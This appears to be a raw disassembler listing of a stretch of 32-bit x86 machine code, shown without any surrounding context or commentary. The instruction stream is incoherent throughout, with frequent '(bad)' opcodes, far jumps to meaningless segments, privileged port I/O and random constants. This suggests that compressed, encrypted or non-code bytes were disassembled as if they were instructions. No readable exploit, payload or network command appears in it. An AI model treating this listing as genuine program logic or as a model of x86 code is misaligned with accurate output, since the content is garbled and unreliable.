  418f0e:	xor    al,0x4a
  418f10:	sbb    DWORD PTR [edx+esi*1+0x14285288],esi
  418f17:	sub    BYTE PTR [edx],0xb7
  418f1a:	mov    eax,DWORD PTR [edx+0x28]
  418f1d:	mov    eax,DWORD PTR [edi-0x6d6bd76c]
  418f23:	jb     0x418ee0
  418f25:	xchg   esi,eax
  418f26:	repnz cmp DWORD PTR [ecx],eax
  418f29:	test   BYTE PTR gs:[edx+0x62],bl
  418f2d:	fsubr  st,st(0)
  418f2f:	jns    0x418f2b
  418f31:	mov    ecx,0xd4e4e9d0
  418f36:	call   0xa516:0x18a04109
  418f3d:	sbb    esp,DWORD PTR [edx]
  418f3f:	push   edx
  418f40:	(bad)  
  418f41:	sbb    ah,BYTE PTR [eax+0x46ffe1ae]
  418f47:	(bad)  [esp+edx*2-0x79]
  418f4b:	shl    BYTE PTR [esi-0x51b55e4d],0x20
  418f52:	dec    ebp
  418f53:	sbb    eax,0x9f50c551
  418f58:	lods   al,BYTE PTR ds:[esi]
  418f59:	adc    DWORD PTR [esi+0x21],eax
  418f5c:	in     eax,dx
  418f5d:	aad    0x82
  418f5f:	test   DWORD PTR [ebx-0x6d],esp
  418f62:	int3   
  418f63:	fstp   st(5)
  418f65:	bound  edi,QWORD PTR [esp+ebx*8]
  418f68:	test   DWORD PTR [ecx],edx
  418f6a:	mov    eax,ds:0xfde302cf
  418f6f:	ret    
  418f70:	or     al,0xb6
  418f72:	sbb    ah,BYTE PTR [edx+ebx*2-0x2f]
  418f76:	or     BYTE PTR [esi],ah
  418f78:	adc    cl,dh
  418f7a:	cwde   
  418f7b:	icebp  
  418f7c:	mov    bl,0xc4
  418f7e:	xchg   DWORD PTR [edi-0x103066cb],ebx
  418f84:	mov    esp,0x8fc4f8fc
  418f89:	scas   al,BYTE PTR es:[edi]
  418f8a:	pushf  
  418f8b:	fstp   st(4)
  418f8d:	jge    0x418f87
  418f8f:	dec    eax
  418f90:	cmc    
  418f91:	sub    ecx,ebx
  418f93:	mov    ebp,0xac36be47
  418f98:	mov    ebx,0x759c1ccf
  418f9d:	(bad)  [esi-0x9]
  418fa0:	push   es
  418fa1:	aas    
  418fa2:	mov    esi,DWORD PTR [edi-0x5a]
  418fa5:	mov    esp,0xdb6000e9
  418faa:	repnz fbld TBYTE PTR [edx+esi*8-0x43a323d]
  418fb2:	aaa    
  418fb3:	add    al,0x89
  418fb5:	jecxz  0x418f57
  418fb7:	add    al,0xf4
  418fb9:	mov    bl,0x97
  418fbb:	cli    
  418fbc:	ror    DWORD PTR [ebx],0xc3
  418fbf:	push   esi
  418fc0:	jl     0x418fbc
  418fc2:	int3   
  418fc3:	push   edx
  418fc4:	xrelease mov DWORD PTR [edi+0x2f],eax
  418fc8:	jmp    DWORD PTR [ebx]
  418fca:	push   ebp
  418fcb:	loope  0x418fa4
  418fcd:	fstp   TBYTE PTR [ebx-0x62]
  418fd0:	clc    
  418fd1:	mov    cl,0xc1
  418fd3:	ins    DWORD PTR es:[edi],dx
  418fd4:	pop    edi
  418fd5:	test   eax,0x248bfae9
  418fda:	push   ecx
  418fdb:	inc    eax
  418fdc:	adc    al,0x4
  418fde:	sub    cl,dl
  418fe0:	or     al,0x8b
  418fe2:	ds popf 
  418fe4:	popa   
  418fe5:	sbb    ecx,ebx
  418fe7:	adc    BYTE PTR [esp+eax*2],ah
  418fea:	jmp    0x418f74
  418fec:	and    ch,BYTE PTR [esi+0x31]
  418fef:	push   ds
  418ff0:	out    0x34,al
  418ff2:	add    ch,al
  418ff4:	enter  0x8126,0x24
  418ff8:	mov    esp,0xefc9b66b
  418ffd:	out    0xbf,eax
  418fff:	or     edi,DWORD PTR [esi+0x3464c54b]
  419005:	mov    al,bl
  419007:	xchg   ebp,eax
  419008:	int3   
  419009:	mov    dl,0x37
  41900b:	fld    st(3)
  41900d:	je     0x419047
  41900f:	dec    ebp
  419010:	imul   esi,DWORD PTR [eax-0x7549b934],0xffffff88
  419017:	mov    al,0x52
  419019:	sub    al,0x33
  41901b:	sub    BYTE PTR [esi],al
  41901d:	test   BYTE PTR [edx+0x4b3c64c9],bh
  419023:	adc    al,0xc4
  419025:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419026:	je     0x419001
  419028:	sbb    BYTE PTR [esi],ch
  41902a:	ror    ebp,cl
  41902c:	jp     0x419022
  41902e:	lods   eax,DWORD PTR ds:[esi]
  41902f:	mov    ds:0x55397455,eax
  419034:	cmp    al,0xc7
  419036:	sbb    DWORD PTR [ebx+0x12],edi
  419039:	pop    ss
  41903a:	je     0x418fd5
  41903c:	or     al,0xa6
  41903e:	test   eax,0x8234e304
  419043:	or     dl,BYTE PTR [ebp-0x4950ad38]
  419049:	dec    ecx
  41904a:	(bad)  
  41904b:	lahf   
  41904c:	fs out dx,eax
  41904e:	mov    es,WORD PTR [ebp+0x3e]
  419051:	mov    ah,0x6b
  419053:	xchg   esi,eax
  419054:	iret   
  419055:	sbb    al,0x1c
  419057:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419058:	push   esi
  419059:	sub    DWORD PTR [eax+0x4a],ebx
  41905c:	add    edx,DWORD PTR [esi-0x29]
  41905f:	mov    edx,0x64eaa634
  419064:	ret    
  419065:	sbb    al,0xe3
  419067:	sbb    eax,0xaa38cdb7
  41906c:	cmp    al,BYTE PTR [esi-0x6c]
  41906f:	inc    edi
  419070:	jmp    0x4190c4
  419072:	in     eax,dx
  419073:	inc    ebp
  419074:	shr    BYTE PTR [eax],0x50
  419077:	dec    edx
  419078:	mov    ds:0x9404f4a5,eax
  41907d:	enter  0x4015,0x10
  419081:	push   ecx
  419082:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419083:	shr    BYTE PTR [edx],cl
  419085:	add    eax,0xac36f4aa
  41908a:	cmp    BYTE PTR [edi+eax*4-0x12ce9cc3],bl
  419091:	jle    0x419059
  419093:	stc    
  419094:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419095:	add    DWORD PTR [ebp+0x5a],eax
  419098:	adc    bh,dl
  41909a:	adc    ecx,DWORD PTR [edx]
  41909c:	jmp    0x4190e8
  41909e:	punpckldq mm3,DWORD PTR [ebx]
  4190a1:	add    al,0x46
  4190a3:	addr16 mov ebp,0xdfbe5fbc
  4190a9:	aad    0xab
  4190ab:	xor    bh,BYTE PTR [edx-0x14]
  4190ae:	sub    DWORD PTR [edi+0x74364088],ebp
  4190b4:	adc    al,0xce
  4190b6:	push   ebx
  4190b7:	mov    DWORD PTR [ebx-0x66],eax
  4190ba:	xchg   ebx,eax
  4190bb:	xor    eax,0x9c3a3736
  4190c0:	cmp    ebp,DWORD PTR [ecx-0x58]
  4190c3:	sbb    eax,0xb454c0ba
  4190c8:	pop    es
  4190c9:	jl     0x4190d1
  4190cb:	rol    DWORD PTR [esi],1
  4190cd:	jne    0x4190b9
  4190cf:	cmp    bl,bl
  4190d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4190d2:	xchg   edi,eax
  4190d3:	jne    0x41907d
  4190d5:	inc    esp
  4190d6:	cmp    ebx,DWORD PTR [eax-0x4d6d89f6]
  4190dc:	dec    esp
  4190dd:	jne    0x41914d
  4190df:	cdq    
  4190e0:	js     0x4190e1
  4190e2:	test   eax,0x795db0da
  4190e7:	out    dx,eax
  4190e8:	jmp    0xa4913b9c
  4190ed:	std    
  4190ee:	shr    ah,0xdd
  4190f1:	pop    ds
  4190f2:	pop    ebp
  4190f3:	cmp    BYTE PTR [esi-0x52b1d427],bh
  4190f9:	int    0xb9
  4190fb:	pop    es
  4190fc:	pmullw mm7,mm0
  4190ff:	fsubr  QWORD PTR ds:0x1737820
  419105:	shl    BYTE PTR [ebp+0x4ddfa4],0xc0
  41910c:	test   bh,0xe7
  41910f:	data16 jb 0x41910e
  419112:	das    
  419113:	jns    0x419113
  419115:	cmp    BYTE PTR [eax-0x5],cl
  419118:	int3   
  419119:	sbb    ebp,edx
  41911b:	fwait
  41911c:	cwde   
  41911d:	xor    BYTE PTR [ebx],cl
  41911f:	dec    ebx
  419120:	dec    ebx
  419121:	icebp  
  419122:	stc    
  419123:	lods   eax,DWORD PTR ds:[esi]
  419124:	popa   
  419125:	cmc    
  419126:	sbb    edi,DWORD PTR [edi-0xa]
  419129:	loop   0x419152
  41912b:	pop    ebx
  41912c:	pop    ebx
  41912d:	bnd jmp 0x41912d
  419130:	test   eax,0x3832bf33
  419135:	clc    
  419136:	mov    ch,0x9d
  419138:	loope  0x419106
  41913a:	mov    bl,0x28
  41913c:	push   edx
  41913d:	xchg   esp,eax
  41913e:	rol    BYTE PTR [edx+ecx*1],cl
  419141:	cmp    al,0x96
  419143:	jle    0x41911b
  419145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419146:	push   edi
  419147:	je     0x419189
  419149:	or     eax,0x520b111
  41914e:	jno    0x419128
  419150:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419151:	sbb    edi,esp
  419153:	push   esp
  419154:	mov    ch,0x10
  419156:	stos   BYTE PTR es:[edi],al
  419157:	add    BYTE PTR [ebx],al
  419159:	sub    al,0xa8
  41915b:	sar    DWORD PTR [ecx+eiz*2],cl
  41915e:	mov    edi,0xb8c14449
  419163:	mov    dh,0x24
  419165:	add    dl,BYTE PTR [ebx]
  419167:	push   ecx
  419168:	inc    edx
  419169:	aad    0x2b
  41916b:	shr    BYTE PTR [edi+eax*8+0x46c4ba5a],cl
  419172:	(bad)  
  419173:	es aam 0x8a
  419176:	sub    DWORD PTR [ebp-0x2d],0xc409374b
  41917d:	and    ebx,esi
  41917f:	push   ebx
  419180:	xor    esp,ebx
  419182:	aam    0xcd
  419184:	add    al,0x83
  419186:	jl     0x419125
  419188:	div    BYTE PTR [eax-0x7b]
  41918b:	aam    0x39
  41918d:	push   esi
  41918e:	xor    ecx,edi
  419190:	inc    esi
  419191:	outs   dx,BYTE PTR ds:[esi]
  419192:	leave  
  419193:	inc    esp
  419194:	push   ebx
  419195:	aad    0x9
  419197:	mov    esp,edx
  419199:	dec    ecx
  41919a:	je     0x41919f
  41919c:	arpl   WORD PTR [eax-0x40],sp
  41919f:	add    al,BYTE PTR [ebx]
  4191a1:	push   esi
  4191a2:	mov    cl,0x52
  4191a4:	xor    ah,cl
  4191a6:	or     ebp,edx
  4191a8:	rcl    DWORD PTR [ecx+ecx*2],0x50
  4191ac:	mov    eax,ds:0x1d60ee11
  4191b1:	loope  0x4191b1
  4191b3:	jno    0x419182
  4191b5:	mov    ds:0xed8c8697,eax
  4191ba:	test   al,0x93
  4191bc:	not    BYTE PTR [edx+0x6e]
  4191bf:	stos   DWORD PTR es:[edi],eax
  4191c0:	out    0xcc,eax
  4191c2:	dec    esp
  4191c3:	or     bl,al
  4191c5:	popa   
  4191c6:	dec    edx
  4191c7:	and    ecx,DWORD PTR [ecx+edx*8]
  4191ca:	dec    edx
  4191cb:	adc    ecx,DWORD PTR [eax+0xdb65346]
  4191d1:	xchg   edi,eax
  4191d2:	mov    ecx,0x56add1fa
  4191d7:	mov    BYTE PTR [eax],ch
  4191d9:	mov    ah,0x16
  4191db:	cld    
  4191dc:	dec    eax
  4191dd:	mov    DWORD PTR [ebp+0x51],eax
  4191e0:	xchg   BYTE PTR [edx+ebx*2],al
  4191e3:	retf   0x8cfd
  4191e6:	mov    BYTE PTR [esi],0x43
  4191e9:	dec    esi
  4191ea:	mov    dh,0x7a
  4191ec:	in     al,dx
  4191ed:	cdq    
  4191ee:	push   0xc4b5d2b2
  4191f3:	cmc    
  4191f4:	cwde   
  4191f5:	lods   al,BYTE PTR ds:[esi]
  4191f6:	sub    BYTE PTR [ebx-0x16495d84],dl
  4191fc:	test   BYTE PTR [ebp+0x6f],ch
  4191ff:	add    BYTE PTR [esi-0x1c],al
  419202:	add    esp,DWORD PTR [edx]
  419204:	jb     0x41920b
  419206:	adc    BYTE PTR [esi+0x5e35c100],ch
  41920c:	or     ebx,0x88ee691d
  419212:	and    ecx,DWORD PTR [ebp-0x5b]
  419215:	xchg   esi,eax
  419216:	rcr    BYTE PTR [esi+0x4d],1
  419219:	mov    ecx,0x9d24f4f0
  41921e:	fiadd  DWORD PTR [esi]
  419220:	sti    
  419221:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  419223:	jmp    0xeaddf822
  419228:	push   edx
  419229:	not    DWORD PTR [ebx]
  41922b:	add    al,0x59
  41922d:	les    ecx,FWORD PTR [ebx+0x64790ead]
  419233:	cmp    BYTE PTR [edi*4+0x4f451117],bl
  41923a:	xchg   esi,eax
  41923b:	fdivr  DWORD PTR [ecx-0x50]
  41923e:	sub    eax,0x3353f183
  419243:	stos   DWORD PTR es:[edi],eax
  419244:	iret   
  419245:	in     eax,dx
  419246:	cld    
  419247:	(bad)
  41924b:	fst    st(5)
  41924d:	sbb    eax,0x70dd31e1
  419252:	fldenv [ecx-0x17]
  419255:	adc    eax,0x79999d9f
  41925a:	(bad)  
  41925b:	jnp    0x419260
  41925d:	outs   dx,DWORD PTR ds:[esi]
  41925e:	sbb    al,BYTE PTR [eax]
  419260:	mov    eax,0x1bffedd6
  419265:	mov    eax,0x37b7dbfe
  41926a:	jb     0x41926b
  41926c:	outs   dx,DWORD PTR ds:[esi]
  41926d:	fs cmc 
  41926f:	in     eax,0x38
  419271:	dec    eax
  419272:	push   cs
  419273:	jmp    0xce5d:0x2d1060e4
  41927a:	mov    ds:0x9f9c9f27,al
  41927f:	jns    0x41927b
  419281:	leave  
  419282:	lea    ebx,[edi-0xb]
  419285:	(bad)  
  419286:	out    dx,al
  419287:	aas    
  419288:	fstp   DWORD PTR [eax-0x15fc3907]
  41928e:	shl    BYTE PTR [ebx],1
  419290:	sbb    BYTE PTR [ecx-0x3d],0x5b
  419294:	(bad)  
  419295:	pop    ss
  419296:	inc    ebp
  419297:	mov    al,ds:0xad8cdac1
  41929c:	loope  0x4192b4
  41929e:	std    
  41929f:	mov    esp,0x5f1ca883
  4192a4:	adc    al,0x38
  4192a6:	fwait
  4192a7:	push   ecx
  4192a8:	xor    DWORD PTR [esi+0x5488686a],ecx
  4192ae:	xor    BYTE PTR [edx-0x62],dh
  4192b1:	ins    DWORD PTR es:[edi],dx
  4192b2:	test   eax,0x72258588
  4192b7:	push   eax
  4192b8:	pop    ss
  4192b9:	and    DWORD PTR [edx+ebx*4+0x46],edx
  4192bd:	adc    BYTE PTR [edx],dl
  4192bf:	loopne 0x419271
  4192c1:	xchg   edx,eax
  4192c2:	mov    bl,0x99
  4192c4:	mov    bh,0xe9
  4192c6:	push   ss
  4192c7:	pop    ebp
  4192c8:	sub    bl,BYTE PTR [edx-0x5d]
  4192cb:	ins    DWORD PTR es:[edi],dx
  4192cc:	por    mm7,QWORD PTR [ebx+0x1c02b5d4]
  4192d3:	dec    ecx
  4192d4:	fsub   QWORD PTR [eax+0x4c]
  4192d7:	iret   
  4192d8:	loop   0x419337
  4192da:	xchg   DWORD PTR [ebp+0x61dd3cfc],ebp
  4192e0:	xchg   edi,eax
  4192e1:	sahf   
  4192e2:	inc    esp
  4192e3:	xor    al,0xab
  4192e5:	xchg   ebx,eax
  4192e6:	push   esp
  4192e7:	or     BYTE PTR [edx],0x63
  4192ea:	inc    ecx
  4192eb:	popf   
  4192ec:	pop    eax
  4192ed:	inc    edi
  4192ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4192ef:	outs   dx,BYTE PTR ds:[esi]
  4192f0:	rcl    al,0x76
  4192f3:	sub    DWORD PTR [ebx+ecx*1+0x6b],ebx
  4192f7:	jnp    0x419329
  4192f9:	push   0xffffffdd
  4192fb:	in     eax,dx
  4192fc:	in     eax,0x7d
  4192fe:	inc    edx
  4192ff:	aad    0xa0
  419301:	sbb    esp,ecx
  419303:	mov    eax,ds:0x5b78e225
  419308:	xor    ebp,DWORD PTR [ebx-0x60ca80cb]
  41930e:	xor    dh,BYTE PTR [esi]
  419310:	push   ebp
  419311:	add    al,BYTE PTR [eax+0x3c]
  419314:	mov    esi,0x42e793c9
  419319:	mov    esi,0xac663179
  41931e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41931f:	fcom   DWORD PTR [ebp+0x2d]
  419322:	jmp    0x419326
  419324:	inc    ebx
  419325:	sbb    eax,0xf1e14a21
  41932a:	shl    DWORD PTR gs:[eax-0x50f2666c],0x4
  419332:	inc    ecx
  419333:	mov    ds:0x45f96ab8,eax
  419338:	sub    DWORD PTR [eax+ebp*1-0x1256f754],esi
  41933f:	ror    ebx,cl
  419341:	xor    bh,dh
  419343:	hlt    
  419344:	pop    ecx
  419345:	inc    ebp
  419346:	aaa    
  419347:	test   DWORD PTR [esi+0xe],ebx
  41934a:	aad    0x5a
  41934c:	inc    edx
  41934d:	outs   dx,BYTE PTR ds:[esi]
  41934e:	inc    ecx
  41934f:	push   esp
  419350:	sbb    DWORD PTR [edx+0x7],esi
  419353:	pop    edx
  419354:	adc    DWORD PTR [esi-0x76],eax
  419357:	inc    eax
  419358:	sub    eax,DWORD PTR [edx+0x108c6140]
  41935e:	cwde   
  41935f:	mov    dl,0xe0
  419361:	call   0xc6fca950
  419366:	dec    ebx
  419367:	sbb    cl,ah
  419369:	mov    edx,0x64202557
  41936e:	test   DWORD PTR [edi+0x3bea1b12],esp
  419374:	sbb    ah,BYTE PTR [ebp+edi*8+0x11d3e594]
  41937b:	lods   eax,DWORD PTR ds:[esi]
  41937c:	push   0xef777b93
  419381:	jecxz  0x419325
  419383:	jge    0x41930b
  419385:	pop    esi
  419386:	jo     0x41930e
  419388:	mov    bl,BYTE PTR [edi-0x7c465f1a]
  41938e:	jae    0x419383
  419390:	mov    cs,WORD PTR [ebx-0x6]
  419393:	adc    ah,bl
  419395:	data16 daa 
  419397:	jnp    0x41932c
  419399:	cmp    edx,eax
  41939b:	or     cl,al
  41939d:	fdivr  DWORD PTR [edx]
  41939f:	icebp  
  4193a0:	xchg   ecx,eax
  4193a1:	arpl   dx,dx
  4193a3:	sub    edi,DWORD PTR [edx]
  4193a5:	pop    es
  4193a6:	iret   
  4193a7:	jg     0x41941e
  4193a9:	xacquire xchg DWORD PTR [edi+0x3bb5ba36],esi
  4193b0:	out    0xe2,al
  4193b2:	xchg   ebx,eax
  4193b3:	(bad)  
  4193b4:	outs   dx,BYTE PTR ds:[esi]
  4193b5:	stos   BYTE PTR es:[edi],al
  4193b6:	loop   0x41939a
  4193b8:	fiadd  DWORD PTR [ebp+edi*2+0x6f037b27]
  4193bf:	or     al,BYTE PTR [eax]
  4193c1:	js     0x4193d8
  4193c3:	outs   dx,BYTE PTR ds:[esi]
  4193c4:	aas    
  4193c5:	cld    
  4193c6:	jne    0x41936d
  4193c8:	jg     0x41940f
  4193ca:	retf   
  4193cb:	jg     0x4193c1
  4193cd:	sub    BYTE PTR [edx+0x69722773],dh
  4193d3:	add    DWORD PTR [ebx+0x79],esi
  4193d6:	arpl   WORD PTR [ecx],di
  4193d8:	mov    esi,0xd7da95d0
  4193dd:	mov    esi,0x5b53e678
  4193e2:	pop    ebp
  4193e3:	std    
  4193e4:	imul   ebp,ecx,0x70
  4193e7:	std    
  4193e8:	addr16 aad 0x3d
  4193eb:	fistp  WORD PTR [esi]
  4193ed:	sub    esp,DWORD PTR [esi-0x62]
  4193f0:	mov    ds:0x16d63970,eax
  4193f5:	cmp    cl,dh
  4193f7:	sub    BYTE PTR [edi-0x70],bl
  4193fa:	fiadd  DWORD PTR [ecx]
  4193fc:	pop    ebx
  4193fd:	imul   ecx,DWORD PTR [ebx+0x6c400fc2],0x145af6d9
  419407:	mov    BYTE PTR [esi],dl
  419409:	adc    ah,BYTE PTR [ebx-0x1aef1757]
  41940f:	inc    ecx
  419410:	les    edx,FWORD PTR [ebp-0x3c46d273]
  419416:	js     0x41945d
  419418:	mov    ds:0x2456a114,al
  41941d:	bound  esi,QWORD PTR [eax]
  41941f:	into   
  419420:	push   ebx
  419421:	pusha  
  419422:	sbb    edx,edi
  419424:	sbb    al,0xf0
  419426:	and    al,0xa2
  419428:	test   al,0x68
  41942a:	rcr    dh,1
  41942c:	rcl    BYTE PTR [eax+0x66],cl
  41942f:	mov    ebx,0x63e31ef3
  419434:	jb     0x419415
  419436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419437:	outs   dx,DWORD PTR ds:[esi]
  419438:	xchg   edi,eax
  419439:	lock mov ds:0xa1c1a650,al
  41943f:	jmp    0xca63:0xedac1cdd
  419446:	push   esp
  419447:	xor    BYTE PTR [edx],al
  419449:	cmp    eax,0x21d126db
  41944e:	inc    edx
  41944f:	inc    esi
  419450:	loope  0x41948c
  419452:	push   esp
  419453:	adc    al,0x24
  419455:	cmp    al,dl
  419457:	cli    
  419458:	add    BYTE PTR [edx],0xc3
  41945b:	sar    BYTE PTR [ecx+0x20],1
  41945e:	sar    al,0x88
  419461:	lds    ecx,FWORD PTR [ebx+esi*2-0x60]
  419465:	data16 clc 
  419467:	mov    bl,0xb3
  419469:	pop    ebp
  41946a:	call   0xad94:0xbd7a0dd3
  419471:	pop    esi
  419472:	add    DWORD PTR [edx+0x22],0x7a
  419476:	mov    ebp,0x78615e8c
  41947b:	neg    DWORD PTR [esi+eax*2-0x5c]
  41947f:	or     eax,0x534b0e91
  419484:	in     eax,dx
  419485:	add    eax,0x809d65d1
  41948a:	adc    bh,BYTE PTR [edi-0x2b]
  41948d:	sbb    esi,DWORD PTR [eax]
  41948f:	jp     0x4194f5
  419491:	rol    DWORD PTR ds:0x9180e523,1
  419497:	lods   al,BYTE PTR ds:[esi]
  419498:	cmp    BYTE PTR [edi],0x3f
  41949b:	cdq    
  41949c:	rep outs dx,DWORD PTR ds:[esi]
  41949e:	pop    ds
  41949f:	sbb    edx,edx
  4194a1:	jmp    0x9215fcff
  4194a6:	sub    BYTE PTR [eax-0x35f7dfd0],al
  4194ac:	out    dx,eax
  4194ad:	pop    ds
  4194ae:	sbb    al,BYTE PTR [ebp-0x7d4c9f2f]
  4194b4:	ficom  WORD PTR [esi-0x61]
  4194b7:	and    bl,BYTE PTR ds:0xc4320d92
  4194bd:	jnp    0x419481
  4194bf:	push   eax
  4194c0:	arpl   WORD PTR [edx],ax
  4194c2:	lea    esi,[ebp-0x54785625]
  4194c8:	and    BYTE PTR [eax],0x23
  4194cb:	(bad)  
  4194cc:	pusha  
  4194cd:	cmp    esi,DWORD PTR [esi]
  4194cf:	sbb    BYTE PTR [ebx*1+0x63ea11a1],cl
  4194d6:	xor    eax,0xed672cb2
  4194db:	push   esp
  4194dc:	enter  0x9dcc,0x5b
  4194e0:	(bad)
  4194e4:	outs   dx,DWORD PTR ds:[esi]
  4194e5:	nop
  4194e6:	push   esp
  4194e7:	mov    dh,0x28
  4194e9:	je     0x419482
  4194eb:	popf   
  4194ec:	ror    DWORD PTR [esi+0x58],1
  4194ef:	cdq    
  4194f0:	loope  0x4194a3
  4194f2:	outs   dx,DWORD PTR ds:[esi]
  4194f3:	push   esp
  4194f4:	leave  
  4194f5:	jbe    0x419495
  4194f7:	in     al,0xc5
  4194f9:	addr16 push cs
  4194fb:	jb     0x4194fb
  4194fd:	xchg   ecx,eax
  4194fe:	cmp    edx,eax
  419500:	fld    QWORD PTR [ebx]
  419502:	jl     0x4194f0
  419504:	mov    ds:0xff730b09,eax
  419509:	mov    cl,0xb9
  41950b:	jns    0x419589
  41950d:	iret   
  41950e:	subps  xmm7,XMMWORD PTR [esi+0x26]
  419512:	mov    edi,0x3d567c67
  419517:	fisttp QWORD PTR [bp+si-0xf]
  41951b:	mov    esi,0x733ecf9e
  419520:	(bad)  [ebx+edi*2-0x83f7dd9]
  419527:	adc    eax,0x67676600
  41952c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41952d:	fucomi st,st(5)
  41952f:	shr    ch,cl
  419531:	jbe    0x4195a2
  419533:	push   esi
  419534:	stc    
  419535:	in     eax,0x6
  419537:	jg     0x4194e8
  419539:	hlt    
  41953a:	pop    edx
  41953b:	sub    BYTE PTR [ebp+0x44ee6abe],ch
  419541:	lahf   
  419542:	cmp    bl,bl
  419544:	xor    edx,DWORD PTR [edi]
  419546:	jecxz  0x419578
  419548:	pop    edx
  419549:	in     eax,dx
  41954a:	or     eax,0xc3fd5f1a
  41954f:	pop    ss
  419550:	jle    0x4195af
  419552:	add    eax,0x5c331ffa
  419557:	std    
  419558:	pusha  
  419559:	std    
  41955a:	std    
  41955b:	addr16 pop ecx
  41955d:	sbb    edi,edi
  41955f:	ss fsubrp st(5),st
  419562:	or     al,0x8b
  419564:	add    ch,bh
  419566:	or     ecx,DWORD PTR [edx]
  419568:	xchg   edi,eax
  419569:	xor    ch,BYTE PTR [eax]
  41956b:	mov    edx,0xbc5d87f4
  419570:	retf   
  419571:	dec    edx
  419572:	push   ss
  419573:	fdivr  QWORD PTR [edx]
  419575:	pushf  
  419576:	cmc    
  419577:	sub    BYTE PTR ds:0xd150c6c4,ch
  41957d:	xor    DWORD PTR [ecx+0x50a54216],edx
  419583:	pop    esi
  419584:	mov    eax,ds:0x105507bc
  419589:	pop    es
  41958a:	xchg   BYTE PTR [edx+0x10],bl
  41958d:	cmp    BYTE PTR [eax-0x4e],0x22
  419591:	arpl   ax,bp
  419593:	or     eax,DWORD PTR [esi+0x37adccbe]
  419599:	jne    0x4195df
  41959b:	mov    ds:0x16808c03,al
  4195a0:	add    esp,edx
  4195a2:	mov    al,0xd6
  4195a4:	shr    DWORD PTR ds:0x8f799b2c,cl
  4195aa:	ret    0xc9f6
  4195ad:	mov    esp,0x63317722
  4195b2:	rcr    DWORD PTR [esi-0x3a],0xc3
  4195b6:	sbb    eax,0x62bd0c68
  4195bb:	rcl    BYTE PTR [esi-0x4f],0xc1
  4195bf:	sahf   
  4195c0:	js     0x4195e9
  4195c2:	push   ebx
  4195c3:	leave  
  4195c4:	adc    al,0x5d
  4195c6:	mov    ebx,0x4882d885
  4195cb:	or     esp,DWORD PTR [ebx+0x51]
  4195ce:	xchg   ebx,eax
  4195cf:	pop    edx
  4195d0:	xor    BYTE PTR [ebx+0x12],cl
  4195d3:	mov    WORD PTR [ebx-0x1e6ce105],ss
  4195d9:	push   ds
  4195da:	and    bl,BYTE PTR [edi-0x359942a0]
  4195e0:	sbb    dh,bh
  4195e2:	in     al,0xc5
  4195e4:	lea    ebx,cs:0x8c7aa20d
  4195eb:	push   cs
  4195ec:	xor    al,0xbd
  4195ee:	int    0x1e
  4195f0:	aad    0x0
  4195f2:	jle    0x4195d7
  4195f4:	lea    ecx,ds:[edx]
  4195f7:	aaa    
  4195f8:	test   eax,0x82463ae8
  4195fd:	push   edx
  4195fe:	jmp    0x944208ce
  419603:	ins    BYTE PTR es:[edi],dx
  419604:	neg    DWORD PTR [ebx]
  419606:	or     bl,BYTE PTR [edx-0x35]
  419609:	push   0xbdb9504a
  41960e:	cmp    al,0xb3
  419610:	and    edi,edi
  419612:	test   DWORD PTR [ecx-0x29c0a0e2],0xcc27aa25
  41961c:	in     al,dx
  41961d:	fwait
  41961e:	es test eax,0x10cae406
  419624:	test   DWORD PTR [edx-0x50b8548a],ecx
  41962a:	xchg   ebx,eax
  41962b:	xchg   edx,eax
  41962c:	test   BYTE PTR [esi+0x4521fd14],0x66
  419633:	adc    edi,edx
  419635:	in     eax,0xc0
  419637:	mov    ah,0x60
  419639:	mov    ecx,DWORD PTR [ebp+ecx*8+0x169a4a56]
  419640:	push   esp
  419641:	jmp    0xca30:0x87d46a11
  419648:	dec    edx
  419649:	pop    esi
  41964a:	or     eax,0x341ae437
  41964f:	push   eax
  419650:	ret    0xe870
  419653:	rol    BYTE PTR [esi-0x58],1
  419656:	aaa    
  419657:	imul   esi,DWORD PTR [ebx+ebx*2+0x2b6b65d],0xfffffff6
  41965f:	pop    ds
  419660:	sub    BYTE PTR [eax-0x1cc4e2f3],bl
  419666:	pop    ecx
  419667:	add    dh,BYTE PTR [ebx]
  419669:	mov    al,ds:0xe2614fa5
  41966e:	or     ch,dl
  419670:	ffree  st(1)
  419672:	or     ebx,DWORD PTR [edi-0x63]
  419675:	arpl   WORD PTR [eax+0x699131c],si
  41967b:	fwait
  41967c:	xchg   edi,eax
  41967d:	xor    al,0xf
  41967f:	cmp    al,0x10
  419681:	mov    bl,0x16
  419683:	popf   
  419684:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419685:	jb     0x41967f
  419687:	das    
  419688:	call   0xfa411388
  41968d:	scas   eax,DWORD PTR es:[edi]
  41968e:	int3   
  41968f:	jl     0x4196fb
  419691:	xor    BYTE PTR [eax],ah
  419693:	fdiv   DWORD PTR [edi+0x5b]
  419696:	js     0x41967e
  419698:	arpl   WORD PTR [ebx+0x45],bx
  41969b:	cli    
  41969c:	in     al,0xef
  41969e:	in     eax,dx
  41969f:	mov    al,0xef
  4196a1:	jnp    0x419682
  4196a3:	cmp    ecx,DWORD PTR [ebx]
  4196a5:	add    al,0xbe
  4196a7:	scas   eax,DWORD PTR es:[edi]
  4196a8:	add    BYTE PTR [eax+0x24dfeeed],dh
  4196ae:	add    BYTE PTR [edi+ebx*1-0x11],bl
  4196b2:	mov    edi,0x97fc59c
  4196b7:	xor    BYTE PTR [ebx+edx*1+0x7d],ch
  4196bb:	(bad)  
  4196bc:	cmpps  xmm0,XMMWORD PTR cs:[ebp-0x186cc8c],0xf8
  4196c5:	fidivr DWORD PTR [ebp+0x17]
  4196c8:	pop    esi
  4196c9:	fdivr  st,st(2)
  4196cb:	out    dx,eax
  4196cc:	mov    ebx,0x6a67f4dd
  4196d1:	int    0x85
  4196d3:	or     DWORD PTR [edi-0x31],esi
  4196d6:	or     DWORD PTR [esi-0x3a],edx
  4196d9:	sahf   
